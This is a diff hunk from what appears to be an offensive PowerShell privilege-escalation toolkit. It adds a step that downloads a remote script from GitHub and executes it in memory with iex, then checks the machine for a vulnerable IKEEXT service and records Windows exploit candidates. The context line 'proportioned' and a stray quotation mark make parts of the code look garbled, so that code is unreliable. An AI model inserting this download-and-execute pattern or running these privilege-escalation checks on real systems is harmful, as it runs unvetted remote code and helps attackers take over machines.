@@ -797,7 +797,10 @@ function privescmodules
 
     Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
     proportioned >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
-
+    
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/IkeextCheck.ps1')
+    Invoke-IkeextCheck >> $currentPath\LocalPrivesc\IkeExtVulnerable.txt"
+    
     $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
     if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
     {
